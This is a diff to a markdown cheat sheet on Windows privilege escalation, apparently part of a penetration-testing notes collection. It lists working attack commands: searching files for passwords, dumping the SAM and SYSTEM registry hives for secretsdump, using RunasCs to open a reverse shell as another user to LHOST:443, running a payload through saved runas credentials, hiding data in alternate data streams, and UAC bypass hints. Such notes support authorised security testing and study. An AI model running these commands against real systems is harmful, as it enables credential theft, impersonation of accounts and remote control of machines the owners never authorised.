@@ -2,7 +2,7 @@
 
 [← Windows quick reference](../04-windows-privesc.md)
 
-## Credential hunting (always do this)
+## Credential hunting
 ```powershell
 # Files
 findstr /si password *.txt *.ini *.config *.xml
@@ -19,7 +19,7 @@ reg save hklm\sam sam ; reg save hklm\system system   # -> secretsdump (above)
 ```
 
 ## Run as another user with creds (RunasCs: no interactive desktop needed)
-Have creds for another account but no interactive logon? `runas` needs a desktop and fails from a reverse shell: RunasCs doesn't:
+From a reverse shell, use RunasCs (plain `runas` needs an interactive desktop):
 ```powershell
 .\RunasCs.exe <user> <pass> "cmd /c whoami"
 .\RunasCs.exe <user> <pass> cmd.exe -r LHOST:443              # reverse shell AS <user>
@@ -28,9 +28,7 @@ Have creds for another account but no interactive logon? `runas` needs a desktop
 # PowerShell-only host (nothing on disk):
 Invoke-RunasCs <user> <pass> "cmd /c whoami" -Domain corp.example
 ```
-Also the move to pivot a service-account shell to a discovered user account.
-
- `dir /R`, `more < file:stream`, `type ... > file:hidden`.
+Alternate data streams: `dir /R`, `more < file:stream`, `type ... > file:hidden`.
 - **machineKey / ViewState:** a leaked `web.config` machine key can undermine ViewState protection. Check the application's signing settings and the actual server-side parser before claiming code execution.
 - **Runas with saved creds:** `runas /savecred /user:admin C:\rev.exe`.
 - UAC bypass only if you're admin-but-not-elevated (fodhelper, etc.).
